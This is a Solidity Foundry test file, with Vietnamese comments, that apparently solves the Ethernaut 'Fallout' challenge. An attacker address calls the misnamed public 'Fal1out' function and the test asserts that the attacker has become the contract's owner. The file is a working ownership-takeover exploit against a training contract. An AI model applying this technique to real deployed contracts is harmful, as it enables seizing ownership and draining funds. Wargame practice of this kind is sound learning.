// SPDX-License-Identifier: MIT
//pragma solidity ^0.6.0;
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallout.sol"; // Đường dẫn đến file code của bạn

contract FalloutTest is Test {
    Fallout public fallout;
    address public attacker = address(0x1337);

    function setUp() public {
        fallout = new Fallout();
        // Giả sử có một số Ether trong contract ban đầu
        vm.deal(address(fallout), 10 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Gán tiền cho attacker để có cái mà gửi đi
        vm.deal(attacker, 1 ether);

        // QUAN TRỌNG: Tên hàm phải khớp chính xác với file Fallout.sol của bạn
        // Nếu trong src bạn để Fal1out (số 1) thì ở đây phải là Fal1out
        fallout.Fal1out{value: 0.0001 ether}();

        // Kiểm tra owner
        assertEq(fallout.owner(), attacker);

        vm.stopPrank();
    }
}
